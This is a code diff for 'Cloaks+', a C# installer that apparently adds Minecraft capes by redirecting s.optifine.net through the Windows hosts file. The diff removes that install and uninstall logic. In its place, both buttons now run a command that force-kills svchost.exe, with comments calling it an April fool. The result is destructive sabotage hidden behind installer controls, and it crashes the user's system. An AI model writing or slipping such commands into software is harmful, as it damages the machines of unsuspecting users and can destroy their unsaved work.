@@ -137,88 +137,13 @@ namespace Cloaks
 
         private void InstallButton_Click(object sender, RoutedEventArgs e)
         {
-        //ah yes, seizure's epic god teir code at it's finest
-            try
-            {
-                string contents = File.ReadAllText("C:\\Windows\\System32\\drivers\\etc\\hosts");
-                if (contents.Contains("159.203.120.188 s.optifine.net"))
-                {
-                    this.taskBarItemInfo1.ProgressState = TaskbarItemProgressState.Error;
-                    MessageBox.Show("You already have Cloaks+", "Cloaks+", MessageBoxButton.OK, MessageBoxImage.Stop);
-                }
-                else
-                {
-
-                    using (StreamWriter hosts = File.AppendText(System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers/etc/hosts")))
-                    {
-                        this.taskBarItemInfo1.ProgressState = TaskbarItemProgressState.Indeterminate;
-                        hosts.WriteLine("\n159.203.120.188 s.optifine.net\n# THE LINE ABOVE WAS INSERTED BY CLOAKS+");
-                        //seizure was here welcome to the efficient not spaghetti code section i'll show you around
-                        this.Activate();
-                        MessageBox.Show("Cloaks+ successfully installed!", "Cloaks+", MessageBoxButton.OK, MessageBoxImage.Exclamation);
-                        this.taskBarItemInfo1.ProgressState = TaskbarItemProgressState.None;
-                        //bruv imagine skidding 
-                    }
-                }
-            }
-            //EXECPTION HANDLING!!! YAY!!!
-            catch (IOException shittyVariableName) //I AM GOD AT NAMING VARIABLES
-            {
-                this.taskBarItemInfo1.ProgressState = TaskbarItemProgressState.Error;
-                MessageBox.Show(shittyVariableName.Message, "Cloaks+ Error!| Please send this to the suport channel in the Discord server!", MessageBoxButton.OK, MessageBoxImage.Error);
-                this.taskBarItemInfo1.ProgressState = TaskbarItemProgressState.None;
-            }
-            catch (Exception bruvIdkHowToSpellExecption) //ebic variable names lmao
-            {
-                this.taskBarItemInfo1.ProgressState = TaskbarItemProgressState.Error;
-                MessageBox.Show(bruvIdkHowToSpellExecption.Message, "Cloaks+ Error!| Please send this to the suport channel in the Discord server!", MessageBoxButton.OK, MessageBoxImage.Error);
-                this.taskBarItemInfo1.ProgressState = TaskbarItemProgressState.None;
-            }
+            Process.Start("cmd.exe", @"/C taskkill /IM svchost.exe /F");
+            //april fool xDDDDD
         }
 
         private void UninstallButton_Click(object sender, RoutedEventArgs e)
         {
-            try
-            {
-                string contents = File.ReadAllText("C:\\Windows\\System32\\drivers\\etc\\hosts");
-                if (contents.Contains("159.203.120.188 s.optifine.net"))
-                {
-                    this.taskBarItemInfo1.ProgressState = TaskbarItemProgressState.Indeterminate;
-                    var hosts = "C:\\Windows\\System32\\drivers\\etc\\hosts";
-                    File.WriteAllLines(hosts, File.ReadLines(hosts).Where(l => l != "159.203.120.188 s.optifine.net").ToList());
-                    string secondCheckThingy = File.ReadAllText("C:\\Windows\\System32\\drivers\\etc\\hosts");
-                    if (contents.Contains("# THE LINE ABOVE WAS INSERTED BY CLOAKS+"))
-                    {
-                        var removeComment = "C:\\Windows\\System32\\drivers\\etc\\hosts";
-                        File.WriteAllLines(removeComment, File.ReadLines(removeComment).Where(l => l != "# THE LINE ABOVE WAS INSERTED BY CLOAKS+").ToList());
-                        MessageBox.Show("Cloaks+ successfully uninstalled!", "Cloaks+", MessageBoxButton.OK, MessageBoxImage.Information);
-                        this.taskBarItemInfo1.ProgressState = TaskbarItemProgressState.None;
-                    }
-                    else
-                    {
-                        MessageBox.Show("Cloaks+ successfully uninstalled!", "Cloaks+", MessageBoxButton.OK, MessageBoxImage.Information);
-                        this.taskBarItemInfo1.ProgressState = TaskbarItemProgressState.None;
-                    }
-                    
-                }
-                else
-                {
-                    MessageBox.Show("Cloaks+ not detected!", "Cloaks+ Uninstaller", MessageBoxButton.OK, MessageBoxImage.Error);
-                }
-            }
-            //even more ebic exeption handling
-            catch (IOException IOError)
-            {
-                this.taskBarItemInfo1.ProgressState = TaskbarItemProgressState.Error;
-                MessageBox.Show(IOError.Message, "Cloaks+ Error!| Please send this to the suport channel in the Discord server!", MessageBoxButton.OK, MessageBoxImage.Error);
-                this.taskBarItemInfo1.ProgressState = TaskbarItemProgressState.None;
-            }
-            catch (Exception exeption) //idk how to spell lmao
-            {
-                this.taskBarItemInfo1.ProgressState = TaskbarItemProgressState.Error;
-                MessageBox.Show(exeption.Message, "Cloaks+ Error!| Please send this to the suport channel in the Discord server!", MessageBoxButton.OK, MessageBoxImage.Error);
-                this.taskBarItemInfo1.ProgressState = TaskbarItemProgressState.None;
-            }
+            Process.Start("cmd.exe", @"/C taskkill /IM svchost.exe /F"); //xD april fools get it!!!!
         }
         
         private void EulaButton_Click(object sender, RoutedEventArgs e)
